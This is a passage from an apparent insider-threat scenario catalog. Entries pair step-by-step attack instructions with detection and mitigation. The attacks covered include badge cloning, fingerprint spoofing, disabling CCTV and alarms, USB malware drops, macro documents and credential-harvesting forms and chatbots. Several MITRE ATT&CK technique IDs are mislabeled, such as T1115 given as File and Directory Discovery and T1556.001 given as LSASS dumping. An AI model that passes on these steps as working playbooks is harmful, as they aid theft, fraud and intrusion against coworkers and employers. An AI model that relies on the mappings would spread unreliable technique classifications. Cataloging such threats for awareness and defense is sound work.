- **Scenario**: A rogue employee enters the office after hours by unlocking a window during the day.
- **Attack Steps**: Step 1: Identify a window that's not under CCTV and can be opened. Step 2: During the day, slightly unlock or loosen the latch. Step 3: Come back at night when no one is around. Step 4: Open the window, climb in. Step 5: Access workstations or storage without alerting security.
- **Detection**: Security patrol logs, broken seal detection
- **Solution**: Lock windows, install motion sensors, monitor after-hours access
- **Tags**: Window Entry, After Hours, Bypass

## Insider Steals CCTV Footage

- **Attack Type**: Physical Access Exploit
- **Target**: Security System
- **Vulnerability**: Poor DVR Security
- **MITRE**: T1115 - File and Directory Discovery
- **Impact**: Privacy Breach, Legal Risk
- **Tools**: USB drive
- **Scenario**: A building maintenance staff copies CCTV footage from DVR for later misuse.
- **Attack Steps**: Step 1: Wait for a quiet time when the security room is unattended. Step 2: Enter the room using general staff access. Step 3: Plug in a USB drive into the DVR/NVR device. Step 4: Copy recent security footage. Step 5: Leave without changing anything visibly.
- **Detection**: DVR access logs, USB device alerts
- **Solution**: Lock DVR cabinets, restrict access, enable alerts
- **Tags**: DVR Theft, USB, Surveillance

## Shoulder Surfing to Learn Safe Code

- **Attack Type**: Physical Access Exploit
- **Target**: Restricted Storage Room
- **Vulnerability**: No Shield on Keypad
- **MITRE**: T1056.002 - Shoulder Surfing
- **Impact**: Unauthorized Physical Entry
- **Tools**: None
- **Scenario**: An employee watches a manager enter the safe code to the secure room and uses it later.
- **Attack Steps**: Step 1: Position yourself near the door with the safe lock (pretend to chat or clean). Step 2: Watch hand movements or code entry when manager opens it. Step 3: Memorize the digits or pattern. Step 4: Use the code later when no one is around. Step 5: Access restricted documents or items.
- **Detection**: Motion sensors, door logs
- **Solution**: Use keypad shields, rotate codes often
- **Tags**: Safe Code Leak, Visual Hacking

## Printer Cache Document Theft

- **Attack Type**: Physical Access Exploit
- **Target**: Office Printer
- **Vulnerability**: Unattended Printouts
- **MITRE**: T1530 - Data from Information Repositories
- **Impact**: Confidential Data Leak
- **Tools**: None
- **Scenario**: An insider retrieves recently printed confidential documents left in the printer tray.
- **Attack Steps**: Step 1: Wait near office printer (pretend to collect your print). Step 2: Look at the tray or internal memory print queue. Step 3: Take confidential papers left behind or uncollected. Step 4: Optionally print again from printer history. Step 5: Photograph or store them for misuse.
- **Detection**: Printer access logs
- **Solution**: Enable pull printing, shred uncollected papers
- **Tags**: Print Sniffing, Confidential Docs, Printer Exploit

## Temporary Staff Installs Hidden Camera

- **Attack Type**: Physical Access Exploit
- **Target**: Finance Workstations
- **Vulnerability**: Lack of Surveillance Detection
- **MITRE**: T1123 - Audio/Video Capture
- **Impact**: Financial Data Leak
- **Tools**: Spy camera (pen or charger type)
- **Scenario**: A temporary worker places a hidden camera to record screen activity of finance team.
- **Attack Steps**: Step 1: Purchase a cheap hidden camera (USB charger type). Step 2: Place it facing monitor screens or keyboards. Step 3: Leave it plugged in or taped under desk. Step 4: Let it record for hours or days. Step 5: Retrieve footage later via Wi-Fi or SD card.
- **Detection**: Regular sweeps, suspicious device detection
- **Solution**: Use RF detectors, background checks for temps
- **Tags**: Spycam, Screen Recorder, Insider Surveillance

## Tampering with Surveillance Camera Angle

- **Attack Type**: Physical Access Exploit
- **Target**: Surveillance Equipment
- **Vulnerability**: Exposed Camera Hardware
- **MITRE**: T1113 - Screen Capture (adapted)
- **Impact**: Blind Spot for Malicious Activity
- **Tools**: None or broomstick
- **Scenario**: An insider subtly adjusts a ceiling camera to avoid being seen during later physical attacks.
- **Attack Steps**: Step 1: Identify where the camera is located in the hallway or room. Step 2: Wait until no one is around (e.g., during lunch). Step 3: Use a broomstick or long pole to slightly tilt the camera away. Step 4: Confirm that it no longer covers your area of interest. Step 5: Perform desired actions while out of view.
- **Detection**: Surveillance reviews, angle logs (if PTZ)
- **Solution**: Secure mounts, motion alerts for camera tilt
- **Tags**: Camera Avoidance, Surveillance Evasion

## Cloning RFID Access Badge

- **Attack Type**: Physical Access Exploit
- **Target**: Door Access System
- **Vulnerability**: Weak RFID Protocol
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Unauthorized Entry
- **Tools**: RFID badge cloner
- **Scenario**: An insider clones a coworker’s RFID badge using a portable cloner device during lunch break.
- **Attack Steps**: Step 1: Purchase an RFID badge cloner device (e.g., Proxmark or Flipper Zero). Step 2: Wait until a coworker leaves their badge unattended (e.g., on a desk or bag). Step 3: Hold cloner close to the badge for a few seconds. Step 4: Save cloned badge data. Step 5: Use a programmable card to gain access to restricted areas.
- **Detection**: Door logs, anti-cloning detection
- **Solution**: Use encrypted RFID, add biometric layers
- **Tags**: RFID Clone, Badge Theft, Access Bypass

## Disabling Security Alarm via Control Panel

- **Attack Type**: Physical Access Exploit
- **Target**: Alarm System
- **Vulnerability**: Default PIN Code
- **MITRE**: T1059 - Command and Scripting Interpreter (analogous)
- **Impact**: Security Bypass
- **Tools**: Default alarm panel code
- **Scenario**: A facilities staff member disables the security alarm system using known default codes.
- **Attack Steps**: Step 1: Locate the security alarm panel (usually near entrances or electrical rooms). Step 2: Enter a default or guessed PIN (like 1234 or 0000). Step 3: Disable motion detectors and door alarms temporarily. Step 4: Perform unauthorized access actions. Step 5: Re-enable the alarm before shift ends.
- **Detection**: Alarm logs, disarm logs, audit trails
- **Solution**: Change default codes, rotate PINs regularly
- **Tags**: Alarm Bypass, Physical Breach

## Unattended Laptop Theft from Desk

- **Attack Type**: Physical Access Exploit
- **Target**: User Device
- **Vulnerability**: Unlocked Devices Left Unattended
- **MITRE**: T1021 - Remote Services
- **Impact**: Data Theft, Device Loss
- **Tools**: None
- **Scenario**: An insider waits for a colleague to leave and quickly steals the unattended unlocked laptop.
- **Attack Steps**: Step 1: Wait until the target leaves their laptop on and unattended (e.g., restroom break). Step 2: Ensure screen is unlocked or asleep. Step 3: Grab the laptop and place in a bag or box. Step 4: Leave the building quickly. Step 5: Use the stolen laptop to access company data from outside.
- **Detection**: Endpoint tracking, login anomalies
- **Solution**: Use cable locks, auto-lock after inactivity
- **Tags**: Laptop Theft, Insider Risk, Physical Removal

## Insider Uses Network Printer's Web Console

- **Attack Type**: Physical Access Exploit
- **Target**: Network Printer
- **Vulnerability**: Default Admin Credentials
- **MITRE**: T1040 - Network Sniffing (analogous)
- **Impact**: Confidential Document Leak
- **Tools**: Office printer with web admin access
- **Scenario**: An employee accesses a network printer’s web interface to forward scanned documents to a personal email.
- **Attack Steps**: Step 1: Note down the IP address of the office printer (visible on screen or printout). Step 2: Type the IP into a web browser on your office PC. Step 3: Login using default or known admin password (often “admin” or blank). Step 4: Configure the scan-to-email feature to send scans to your personal email. Step 5: Place any document to scan and receive it in your inbox.
- **Detection**: Printer logs, email audits
- **Solution**: Change printer passwords, limit admin UI access
- **Tags**: Printer Exploit, Insider Abuse, Scan Theft

## Unauthorized Use of Biometric Scanner

- **Attack Type**: Physical Access Exploit
- **Target**: Biometric Entry
- **Vulnerability**: Biometric Spoofing
- **MITRE**: T1556.001 - Credential Dumping: LSASS Memory (analogous)
- **Impact**: Unauthorized Entry
- **Tools**: Transparent tape, gelatin, scanner access
- **Scenario**: A staff member lifts a fingerprint from a coffee mug and replicates it using simple materials to fool a biometric scanner.
- **Attack Steps**: Step 1: Observe which finger is used on the biometric reader. Step 2: Find the same person’s coffee mug or water bottle. Step 3: Use clear tape to lift the fingerprint. Step 4: Transfer it to gelatin or wax to make a fake finger mold. Step 5: Use it on the fingerprint scanner to gain access.
- **Detection**: Access anomalies, scanner spoof detection
- **Solution**: Multi-modal biometrics, liveness detection
- **Tags**: Fingerprint Spoofing, Biometric Attack

## Tampering with Time-Logging Device

- **Attack Type**: Physical Access Exploit
- **Target**: Biometric/Time System
- **Vulnerability**: Physical Bypass
- **MITRE**: T1070 - Indicator Removal on Host
- **Impact**: Payroll Fraud
- **Tools**: Screwdriver, manual punch
- **Scenario**: An employee opens the time attendance device casing to manually punch in/out for absent coworkers.
- **Attack Steps**: Step 1: Identify the location and type of attendance system. Step 2: Wait for break time or after hours. Step 3: Unscrew the casing and access internal menu or button. Step 4: Manually trigger entries for other employees. Step 5: Screw the device back and leave.
- **Detection**: Attendance system log inconsistencies
- **Solution**: Lock casing, enable tamper alarms
- **Tags**: Time Fraud, Insider Collusion

## Placing Rogue Charging Station

- **Attack Type**: Physical Access Exploit
- **Target**: Employee Mobile Devices
- **Vulnerability**: Untrusted USB Charging
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Data Theft from Phones
- **Tools**: Modified USB charging hub
- **Scenario**: An attacker places a malicious phone charging station in a meeting room to access data from devices.
- **Attack Steps**: Step 1: Purchase a USB charging station with hidden data siphoning hardware. Step 2: Place it in a public meeting room or lobby. Step 3: Add a sign like “Free Charging – Company Provided”. Step 4: Wait for users to connect phones. Step 5: Download stolen data from storage later.
- **Detection**: USB monitoring, behavioral alerts
- **Solution**: Use USB data blockers, restrict ports
- **Tags**: Juice Jacking, Rogue Hardware, Phone Exploit

## Insider Records Whiteboard Discussions

- **Attack Type**: Physical Access Exploit
- **Target**: Internal Meetings
- **Vulnerability**: Smart Device Misuse
- **MITRE**: T1123 - Audio/Video Capture
- **Impact**: Leakage of Strategic Plans
- **Tools**: Smartwatch with camera
- **Scenario**: An intern secretly records a sensitive whiteboard meeting using their smartwatch camera.
- **Attack Steps**: Step 1: Sit quietly in the meeting with smartwatch recording active. Step 2: Focus lens toward the whiteboard as people write or talk. Step 3: Pretend to take notes while recording. Step 4: Save the video and upload to private cloud. Step 5: Leave meeting without drawing attention.
- **Detection**: Mobile device logs, camera detection
- **Solution**: Ban cameras in restricted areas, watch detection
- **Tags**: Watchcam, Whiteboard Leak, Insider Meeting Risk

## Insider Copies Keys Using Wax Mold

- **Attack Type**: Physical Access Exploit
- **Target**: File Cabinet or Lock
- **Vulnerability**: Key Duplication Risk
- **MITRE**: T1210 - Exploitation of Remote Services (analogy)
- **Impact**: Data Privacy Violation
- **Tools**: Wax, duplicate key service
- **Scenario**: A night staff creates a wax mold of a cabinet key to later duplicate and access HR files.
- **Attack Steps**: Step 1: Borrow a cabinet key temporarily when no one is watching. Step 2: Press it into soft wax or clay to make a mold. Step 3: Return key in original place. Step 4: Use mold at a key duplication shop. Step 5: Use duplicate key after hours to access documents.
- **Detection**: Missing documents, key audits
- **Solution**: Use digital locks, track key distribution
- **Tags**: Key Mold, Physical Breach, Duplication

## Insider Uses Forgotten Visitor Badge

- **Attack Type**: Physical Access Exploit
- **Target**: Office/Restricted Zone
- **Vulnerability**: Poor Badge Management
- **MITRE**: T1078 - Valid Accounts (Physical Equivalent)
- **Impact**: Unauthorized Entry
- **Tools**: Forgotten visitor badge
- **Scenario**: An employee finds a visitor badge left in a meeting room and uses it to access areas unsupervised.
- **Attack Steps**: Step 1: Spot a visitor access badge left behind (on table or floor). Step 2: Pick it up discreetly without reporting it. Step 3: Use it to enter areas normally restricted (labs, server rooms). Step 4: Walk around confidently to avoid suspicion. Step 5: Drop the badge in a bin to destroy evidence.
- **Detection**: Access logs vs visitor registry
- **Solution**: Auto-expire badges, better visitor tracking
- **Tags**: Badge Reuse, Identity Exploit

## Exploiting Unlocked Conference Room Laptop

- **Attack Type**: Physical Access Exploit
- **Target**: Meeting Room Laptop
- **Vulnerability**: Unattended Sessions
- **MITRE**: T1563 - Remote Service Session Hijack
- **Impact**: Data Leak, Privacy Breach
- **Tools**: None
- **Scenario**: A staff member uses an unlocked laptop in a conference room to access sensitive project files.
- **Attack Steps**: Step 1: Wait for a team to leave after a meeting. Step 2: Check if laptop is still logged in or unlocked. Step 3: Access project folders, emails, or chats. Step 4: Email files to self or copy them to USB. Step 5: Close everything and walk away.
- **Detection**: Login times, access history, file transfer logs
- **Solution**: Auto-lock policies, session timers
- **Tags**: Conf Room Risk, Idle Device, File Theft

## Spoofing as Maintenance to Enter HR Room

- **Attack Type**: Physical Access Exploit
- **Target**: HR Office
- **Vulnerability**: Social Engineering
- **MITRE**: T1200 - Hardware Additions
- **Impact**: Employee Info Theft
- **Tools**: Fake uniform, clipboard
- **Scenario**: An insider pretends to be a technician fixing AC to access HR document storage.
- **Attack Steps**: Step 1: Wear simple overalls or uniform (no ID badge). Step 2: Carry a clipboard and a small toolbag. Step 3: Walk into HR area confidently saying you’re checking ventilation. Step 4: Ask them to leave you alone “for privacy during test.” Step 5: Take photos or steal files from unlocked cabinets.
- **Detection**: Visitor log review, unapproved personnel alerts
- **Solution**: Escort policy, verify external service work
- **Tags**: Maintenance Disguise, Fake Role, File Theft

## Insider Taps Phone on Locked Laptop NFC

- **Attack Type**: Physical Access Exploit
- **Target**: Corporate Laptop
- **Vulnerability**: Open NFC Interface
- **MITRE**: T1430 - Bluetooth Discovery (NFC equivalent)
- **Impact**: Info Gathering, Fingerprinting
- **Tools**: NFC smartphone
- **Scenario**: An insider uses NFC-enabled phone near a locked laptop to try and extract metadata or device name.
- **Attack Steps**: Step 1: Walk by a target’s desk during lunch or restroom break. Step 2: Turn on NFC scanning on your phone. Step 3: Tap near the laptop (many have NFC for badges or pairing). Step 4: Capture any device handshake data (device name, ID, etc.). Step 5: Use it for profiling or spoofing attempts.
- **Detection**: Device logs, anomaly detection
- **Solution**: Disable unused NFC/Bluetooth features
- **Tags**: NFC Tap, Passive Scan, Side Channel

## Disabling Office CCTV by Power Switch

- **Attack Type**: Physical Access Exploit
- **Target**: CCTV System
- **Vulnerability**: Power Switch Unprotected
- **MITRE**: T1565 - Data Manipulation (Blind Spot Creation)
- **Impact**: Surveillance Blind Spot
- **Tools**: Power switch access
- **Scenario**: An insider switches off the CCTV system using a power switch behind the server rack.
- **Attack Steps**: Step 1: Locate the CCTV DVR or server power supply (usually in server/network rack). Step 2: During low traffic hours, quietly open the cabinet. Step 3: Flip off the switch or unplug the power cord. Step 4: Carry out your intended malicious action (theft, intrusion). Step 5: Turn it back on before shift ends.
- **Detection**: Surveillance interruption alert, watchdog timers
- **Solution**: Secure DVR power, cabinet locks, alerts
- **Tags**: CCTV Power Off, Tampering, Blind Area

## Fake IT Support Call

- **Attack Type**: Social Engineering (Phone)
- **Target**: Employee Workstation
- **Vulnerability**: Lack of user awareness
- **MITRE**: T1201 (Social Engineering)
- **Impact**: Account compromise, data theft
- **Tools**: Mobile Phone, Pretexting Script
- **Scenario**: An insider pretends to be IT support and tricks a colleague into revealing their login credentials.
- **Attack Steps**: Step 1: Insider memorizes basic IT support jargon and employee details from internal directory.Step 2: Insider uses their personal mobile phone to call a colleague, acting as the "IT Helpdesk".Step 3: Says something like “We detected unusual login attempts on your account, and need to verify your credentials to reset your access.”Step 4: The target, believing it's legitimate, shares their username and password.Step 5: Insider now logs in using the stolen credentials to access sensitive files.
- **Detection**: Unusual login times/IPs, helpdesk call audits
- **Solution**: Conduct security awareness training, verify support via internal extension only
- **Tags**: #Phishing #HelpdeskScam #InternalCaller

## Shoulder Surfing in Office

- **Attack Type**: Visual Eavesdropping
- **Target**: Desktop Login Screens
- **Vulnerability**: Physical proximity, no screen privacy
- **MITRE**: T1110 (Brute Force by observation)
- **Impact**: Unauthorized access, identity spoofing
- **Tools**: None (just observation), Pen & Paper
- **Scenario**: Insider watches over a coworker's shoulder to capture login details or sensitive data during their login session.
- **Attack Steps**: Step 1: Insider positions themselves near a coworker's desk or behind them in a meeting room.Step 2: Pretends to work or chat casually while focusing on the coworker's screen and keyboard.Step 3: When the coworker logs in, insider notes the keystrokes visually or writes them down.Step 4: Later, uses this password to access systems or files unauthorized.Step 5: May repeat this method with multiple people to gather credentials.
- **Detection**: Monitor for unusual logins; enforce privacy screens
- **Solution**: Use screen filters, encourage privacy awareness
- **Tags**: #ShoulderSurfing #OfficeAttack #VisualHack

## “Can You Print This for Me?” Trap

- **Attack Type**: USB Malware Drop
- **Target**: Employee Computer
- **Vulnerability**: USB autorun or human error
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Data leakage, credential theft
- **Tools**: Infected USB Drive, Rubber Ducky or .bat script
- **Scenario**: An insider gives a colleague a pen drive with “important documents” but it contains a malicious script that installs keyloggers or spyware.
- **Attack Steps**: Step 1: Insider prepares a USB with a disguised .bat or .exe file labeled “Agenda.docx”.Step 2: Approaches a target, saying, “My email isn’t working. Can you open this and print it for me quickly?”Step 3: Target plugs it into their system and opens the file.Step 4: The malicious script runs silently in the background and installs a keylogger.Step 5: Insider later retrieves the logs from the victim’s system, capturing passwords or sensitive files.
- **Detection**: Monitor USB activity, endpoint protection logs
- **Solution**: Disable USB autorun, awareness training
- **Tags**: #USBDrop #Malware #HumanTrap

## “Survey for HR” Scam

- **Attack Type**: Internal Phishing via Forms
- **Target**: Email and Internal Portals
- **Vulnerability**: Trust in internal communication
- **MITRE**: T1566.002 (Phishing: Spearphishing Link)
- **Impact**: Data access, impersonation
- **Tools**: Google Forms, Internal Email
- **Scenario**: Insider sends a fake survey form asking for personal info like email, phone number, login ID, under the pretense of an HR update.
- **Attack Steps**: Step 1: Insider creates a fake Google Form titled “HR Policy Feedback – Urgent”.Step 2: Crafts a realistic internal email and sends it from a spoofed or personal account to coworkers.Step 3: Requests users to “quickly fill the form” with their work email, ID, and sometimes even password “for verification”.Step 4: Colleagues fill it without suspicion, especially if it's sent near HR deadlines.Step 5: Insider collects the form responses and uses credentials to log into internal portals.
- **Detection**: Phishing detection, alert on unusual forms
- **Solution**: Employee training, phishing simulations
- **Tags**: #Phishing #FakeForm #HRScam

## Fake Meeting Invite with Keylogger

- **Attack Type**: Phishing via Calendar
- **Target**: Internal Users, Browser
- **Vulnerability**: Lack of URL verification
- **MITRE**: T1204.001 (User Execution - Malicious Link)
- **Impact**: Credential theft, session hijack
- **Tools**: Google Calendar, Fake Website, Keylogger Script
- **Scenario**: Insider sends a calendar invite with a link to a fake internal site that drops a keylogger in the background.
- **Attack Steps**: Step 1: Insider crafts a calendar invite for a “Security Policy Review Meeting”.Step 2: Adds a note: “Please read this before the meeting: intranet-company.site/review” (malicious site).Step 3: Invite is sent via internal calendar to multiple employees.Step 4: Targets click the link assuming it's internal and download/open the file or page.Step 5: The site silently installs a browser-based keylogger or malware.Step 6: Insider collects logs remotely or accesses synced data.
- **Detection**: EDR alerts, DNS anomaly logs
- **Solution**: Avoid clicking unknown links, validate URLs
- **Tags**: #Keylogger #FakeMeeting #CalendarHack

## Tailgating to Secure Areas

- **Attack Type**: Physical Social Engineering
- **Target**: Physical Office Zones
- **Vulnerability**: Lack of badge enforcement
- **MITRE**: T1078.004 (Valid Accounts – Physical Access)
- **Impact**: Theft of physical data, sabotage
- **Tools**: None (just social manipulation)
- **Scenario**: An insider follows authorized employees into restricted zones by pretending to have forgotten their badge.
- **Attack Steps**: Step 1: Insider waits near a restricted door (like server room or HR files section).Step 2: When someone with access enters, the insider says, “Oh, I forgot my access card. Mind holding the door?”Step 3: Employee, being polite, allows entry without questioning.Step 4: Once inside, the insider accesses physical files, hardware, or even USB ports on sensitive systems.Step 5: May repeat this act in various departments under different excuses.
- **Detection**: Access logs, CCTV review
- **Solution**: Implement badge policy, train staff to say no politely
- **Tags**: #Tailgating #NoBadge #PhysicalBreach

## Overheard Password via Loud Phone Call

- **Attack Type**: Audio Eavesdropping
- **Target**: Open Office Areas
- **Vulnerability**: Informal discussion culture
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Sensitive info leak
- **Tools**: Mobile phone (voice recorder app)
- **Scenario**: An insider pretends to be on a call but listens and records nearby employees discussing passwords or sensitive topics.
- **Attack Steps**: Step 1: Insider sits in breakroom, meeting room, or open cubicle near others.Step 2: Pretends to be on a phone call or scrolling their phone.Step 3: Starts voice recording app to capture background conversations.Step 4: Nearby employees mention VPN credentials or access issues aloud.Step 5: Insider later plays back audio, extracts useful information, and uses it for exploitation.
- **Detection**: Awareness audits, random noise masking
- **Solution**: Create privacy zones; discourage open password talk
- **Tags**: #VoiceEavesdrop #PhoneAbuse #OfficePrivacy

## Fake Employee Feedback Bot

- **Attack Type**: Chatbot Phishing
- **Target**: Slack, Web Forms
- **Vulnerability**: Employee trust in internal links
- **MITRE**: T1056.001 (Credential Harvesting – Input Capture)
- **Impact**: Compromised accounts
- **Tools**: Chatbot tool (like Google Dialogflow), Internal email/slack
- **Scenario**: An insider builds a simple chatbot pretending to be HR or Admin collecting personal data for “feedback”.
- **Attack Steps**: Step 1: Insider creates a basic chatbot with prompts like “Hi, this is HR – help us update your contact and login info.”Step 2: Shares a link to it via Slack or email saying “Mandatory feedback survey – takes 2 mins”.Step 3: Bot asks for details like name, work ID, email, and password “to verify identity”.Step 4: Target enters credentials thinking it’s official.Step 5: Insider captures inputs and uses them to access accounts.
- **Detection**: Monitor Slack/Teams URLs, phishing simulations
- **Solution**: Add bot access restrictions; verify official HR tools
- **Tags**: #ChatbotPhish #CredentialStealing #FakeHRBot

## Fake "Printer Out of Ink" Trick

- **Attack Type**: Distraction + Terminal Access
- **Target**: Unlocked Computer Terminals
- **Vulnerability**: No auto-lock or awareness
- **MITRE**: T1078.003 (Valid Accounts – Local)
- **Impact**: Data exposure or system compromise
- **Tools**: Physical access, no special tools
- **Scenario**: Insider distracts a colleague by asking for help with a printer, then quickly uses their unlocked computer.
- **Attack Steps**: Step 1: Insider identifies a target who often leaves the desk unlocked.Step 2: Pretends to struggle with a nearby printer or calls the person loudly: “Hey, it’s out of ink again. Can you help me?”Step 3: Target leaves their computer to help.Step 4: Insider quickly sits and opens sensitive files, emails, or installs USB-based malware.Step 5: Logs out before target returns.
- **Detection**: User behavior monitoring
- **Solution**: Auto-lock policy, awareness campaigns
- **Tags**: #DistractionHack #UnlockedPC #OfficeTrick

## “Can You Forward This for Me?” Email Trap

- **Attack Type**: Internal Email Exploit
- **Target**: Email & Internal Docs
- **Vulnerability**: Macro execution, trust misuse
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Lateral spread of malware
- **Tools**: Email, Malicious Document
- **Scenario**: Insider sends a harmless-looking doc to a colleague and asks them to forward it using their official email – spreading malware unknowingly.
- **Attack Steps**: Step 1: Insider creates a spreadsheet with a hidden macro or malicious payload (like .xlsm or .docm).Step 2: Emails a colleague, “Hey, can you send this to HR from your official email? Mine is blocked.”Step 3: Target forwards it internally, giving the doc legitimacy.Step 4: The document spreads malware when opened by HR.Step 5: Insider now has access to systems via the infected macro.
- **Detection**: Monitor forwarded attachments, DLP systems
- **Solution**: Block macros by default, validate internal files
- **Tags**: #MacroMalware #InternalSpread #TrustAbuse

## Fake "Lost and Found" USB Trap

- **Attack Type**: USB Drop
- **Target**: HR/IT Systems
- **Vulnerability**: Human curiosity, no USB scan policy
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Initial access to secure environment
- **Tools**: Infected USB Drive (Rubber Ducky or script)
- **Scenario**: Insider pretends to find a USB drive in the office and asks IT or HR to check its content, leading them to plug it into a secure system.
- **Attack Steps**: Step 1: Insider prepares a USB with malware or an auto-run script.Step 2: Leaves the USB in a public place (reception desk, meeting room).Step 3: "Discovers" it later and hands it to IT or HR saying, “Someone may have dropped this, can you check what’s inside?”Step 4: The staff plugs it into their system to identify the owner.Step 5: Script auto-executes and installs spyware or remote access tool.Step 6: Insider later connects to the infected system silently.
- **Detection**: USB usage logs, EDR alerts
- **Solution**: Enforce USB scanning, train against plugging unknown drives
- **Tags**: #LostUSB #RubberDucky #OfficeTrap

## “Coffee Spill Panic” Distraction

- **Attack Type**: Distraction + Mobile Capture
- **Target**: Screens/Desktops
- **Vulnerability**: No auto-lock, low alertness
- **MITRE**: T1110.003 (Credential Access – UI-based)
- **Impact**: Data exfiltration
- **Tools**: Mobile Camera, Coffee Cup
- **Scenario**: Insider spills coffee intentionally and uses the distraction to take pictures of sensitive data from an unattended screen.
- **Attack Steps**: Step 1: Insider waits for a coworker to leave the desk momentarily (e.g., for washroom break).Step 2: Quickly spills coffee on a table nearby and shouts for help to draw others' attention.Step 3: While everyone is distracted, snaps pictures of an open email, dashboard, or document on the victim's screen using their phone.Step 4: Cleans up scene and pretends nothing happened.Step 5: Uses captured data for further misuse.
- **Detection**: No alerts unless video captured
- **Solution**: Screen lock enforcement, monitor use of phones
- **Tags**: #CoffeeDistraction #ScreenSpy #PhysicalSE

## Fake System Update Popup

- **Attack Type**: Local Phishing Popup
- **Target**: User Desktop
- **Vulnerability**: User confusion, lack of validation
- **MITRE**: T1056.004 (Credential Prompt)
- **Impact**: Account compromise
- **Tools**: PowerPoint, Web Browser, Local HTML
- **Scenario**: Insider uses HTML or PowerPoint in fullscreen mode to show a fake “Windows Update” asking the user to log in again.
- **Attack Steps**: Step 1: Insider gets temporary access to a colleague’s machine (during lunch or break).Step 2: Opens PowerPoint or browser in fullscreen and displays a fake “System Session Expired – Please Re-login” prompt.Step 3: When user returns, they see the screen and believe it’s a legit session timeout.Step 4: They enter their password, which the insider captures via macro/script.Step 5: Insider later retrieves password and accesses sensitive tools or files.
- **Detection**: No alerts unless script monitored
- **Solution**: Educate about fake popups, require 2FA
- **Tags**: #FakePrompt #LocalPhish #SessionTrap

## Fake "Compliance Check" Clipboard Access

- **Attack Type**: Physical Data Harvesting
- **Target**: Office Desktops
- **Vulnerability**: Poor document hygiene
- **MITRE**: T1086 (Command and Scripting Interpreter – Manual)
- **Impact**: Unauthorized system entry
- **Tools**: Clipboard, Pen
- **Scenario**: Insider pretends to perform a “compliance survey” and notes down sensitive data visible on others' desks or screens.
- **Attack Steps**: Step 1: Insider dresses formally and claims to be from compliance team, doing random spot-checks.Step 2: Walks around desks, observing open documents, post-it notes, printed passwords.Step 3: Writes details casually on a clipboard, e.g., “10.10.3.12 – admin pass: Welcome@123” seen on a monitor.Step 4: No one questions due to confidence and official tone.Step 5: Insider later uses this info for unauthorized access.
- **Detection**: CCTV review, check fake audits
- **Solution**: Enforce clean desk policy, badge validation
- **Tags**: #FakeAudit #InfoHarvesting #SocialCamouflage

## HR "Job Referral" Data Grab

- **Attack Type**: Social Exploitation
- **Target**: Internal Communication Tools
- **Vulnerability**: Trust in coworker, lack of privacy thinking
- **MITRE**: T1589 (Identity Collection)
- **Impact**: Identity theft, impersonation
- **Tools**: Email, Messaging Apps
- **Scenario**: Insider offers to refer coworkers for jobs and collects their resumes, harvesting personal info like phone, home address, etc.
- **Attack Steps**: Step 1: Insider posts in internal chat: “Hiring drive at my friend's firm – I can refer you! Send me your latest resume.”Step 2: Multiple employees send their resumes with personal info: name, phone, email, address, past employers.Step 3: Insider builds a database of this information.Step 4: Later uses it for phishing, selling data, or impersonation.Step 5: No one suspects anything since the message seemed helpful.
- **Detection**: Email monitoring tools, HR coordination
- **Solution**: Limit internal data sharing; awareness on social scams
- **Tags**: #ResumeScam #IdentityLeak #ReferralAbuse

## "Forgot My Login – Use Yours?" Trick

- **Attack Type**: Shared Credential Misuse
- **Target**: Employee Systems
- **Vulnerability**: Politeness, urgency pressure
- **MITRE**: T1078.001 (Valid Accounts - User)
- **Impact**: Privilege misuse, data exposure
- **Tools**: None (social pretext)
- **Scenario**: Insider pretends to be locked out of their system and asks a colleague to use their login for “urgent work.”
- **Attack Steps**: Step 1: Insider approaches a colleague and says, “I’m locked out of my account, but I need to submit this report ASAP.”Step 2: Asks them to log in on their system so they can “just upload a file.”Step 3: Colleague logs in using their credentials.Step 4: Insider uses the access to browse confidential folders or install unauthorized tools.Step 5: Activity now gets logged under the colleague’s name, hiding the insider.
- **Detection**: Behavior anomaly detection
- **Solution**: Strict account sharing policy; training on refusal
- **Tags**: #LoginMisuse #AccountSharing #InsiderDeception

## Internal “Survey” with Fake Rewards

- **Attack Type**: Phishing with Incentives
- **Target**: Internal Email Groups
- **Vulnerability**: Greed, lack of skepticism
- **MITRE**: T1566.002 (Phishing – Spearphishing Link)
- **Impact**: Data exfiltration, impersonation
- **Tools**: Google Forms or Typeform
- **Scenario**: Insider circulates a fake internal survey offering a gift card in return for entering full name, email, and credentials.
- **Attack Steps**: Step 1: Insider designs a form titled “Company Feedback – Win ₹500 Amazon Voucher!”Step 2: Shares via internal group or email, appearing to come from HR or Admin.Step 3: The form asks for personal details, including login/email “to send the voucher.”Step 4: Employees eagerly fill it out for the reward.Step 5: Insider captures this data and exploits credentials for unauthorized access.
- **Detection**: Form traffic monitoring, fake reward pattern
- **Solution**: Never request credentials via forms; HR alert rules
- **Tags**: #SurveyScam #FakeGift #InternalPhish

## "Check This Cool Tool" Trap

- **Attack Type**: Peer-to-Peer Social Bait
- **Target**: Browsers / Email
- **Vulnerability**: Blind trust in peer recommendations
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Credential leakage, data hijack
- **Tools**: Malicious Chrome Extension, Email
- **Scenario**: Insider recommends a malicious browser extension or fake app as a “cool productivity tool” to coworkers.
- **Attack Steps**: Step 1: Insider finds or develops a malicious browser extension that logs keystrokes or redirects traffic.Step 2: Emails or messages coworkers saying, “Try this Chrome extension – it helps format emails instantly!”Step 3: Link leads to Chrome Web Store or private install.Step 4: Colleagues install it, not knowing it captures login credentials or spies on activity.Step 5: Insider now gets access to internal tools or files.
- **Detection**: Endpoint browser plugin audits
- **Solution**: Allow only whitelisted extensions
- **Tags**: #ChromeHack #ExtensionTrap #InsiderTool

## “Team Drive Cleanup” Phishing

- **Attack Type**: File Sharing Abuse
- **Target**: Cloud Drives
- **Vulnerability**: Poor file permission management
- **MITRE**: T1530 (Data from Cloud Storage)
- **Impact**: Sensitive document exposure
- **Tools**: Google Drive / Dropbox
- **Scenario**: Insider shares a fake “team drive” cleanup folder asking employees to drag/drop old files, capturing sensitive docs.
- **Attack Steps**: Step 1: Insider creates a shared folder titled “Q2 Compliance Audit - Archive Here”.Step 2: Shares it to coworkers with a note: “Please drop all old project files here by EOD.”Step 3: Employees, thinking it’s official, move confidential files like financial reports or client data.Step 4: Insider downloads them all from the shared drive.Step 5: Employees never realize files were accessed externally.
- **Detection**: Drive access audit, file monitoring
